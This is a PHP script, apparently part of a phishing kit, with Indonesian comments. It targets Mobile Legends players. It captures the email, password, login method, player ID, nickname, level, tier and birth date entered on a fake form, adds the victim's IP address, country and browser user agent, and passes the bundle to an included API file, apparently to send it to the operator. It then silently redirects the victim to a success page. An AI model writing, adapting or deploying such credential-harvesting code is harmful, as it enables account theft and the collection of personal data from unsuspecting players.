<?php
// MENGAMBIL KONTROL
include 'email.php';
include 'system/geo.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$playid = $_POST['playid'];
$nick = $_POST['nick'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$day = $_POST['day'];
$month = $_POST['month'];
$year = $_POST['year'];

$ip = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);
$useragent = $_SERVER['HTTP_USER_AGENT'];


// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == "" && $userIdForm == "" && $level == "" && $tier == "" && $nick == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN

$pesan = "
Informasi Akun Mobile Legends
Email Akun: ".$email."
Password Akun: ".$password."
Login: ".$login."

Detail Akun Mobile Legends
ID Karakter: ".$playid."
Nickname: ".$nick."
Level Akun: ".$level."
Tier: ".$tier."
Tgl lahir: ".$day." ".$month." ".$year."

Informasi Device
Time: ".$times." / ".$date."
Country: ".$country."
IP Address: ".$_SERVER["REMOTE_ADDR"]."
User-Agent: ".$useragent."
";

$kirim = $pesan;include("system/api.php");
// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($pesan) {
echo "<form id='gaskan' method='POST' action='success.php'>
<input type='hidden' name='nickname' value='$nick'>
<input type='hidden' name='useridForm' value='$playid'>
</form>
<script type='text/javascript'>document.getElementById('gaskan').submit();</script>";
}
}
?>